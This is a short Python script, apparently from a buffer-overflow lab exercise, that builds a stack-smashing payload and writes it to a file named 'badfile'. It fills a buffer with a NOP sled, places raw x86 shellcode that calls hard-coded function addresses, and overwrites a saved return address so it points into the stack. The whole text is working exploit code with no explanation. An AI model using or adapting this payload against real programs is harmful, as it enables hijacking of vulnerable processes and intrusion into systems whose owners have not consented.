shellcode=(
"\xBB\x1E\x85\x04\x08"
"\xFF\xD3"
"\x50"
"\xBB\x10\x85\x04\x08"
"\xFF\xD3"
	).encode('latin-1')
content = bytearray(0x90 for i in range(1962))
start = 1962 - len(shellcode)
content[start:] = shellcode
offset = 411
ret= 0xbfffe5d8+800
content[offset+4:offset+8] = (ret).to_bytes(4,byteorder='little')
with open('badfile','wb') as f:
    f.write(content)
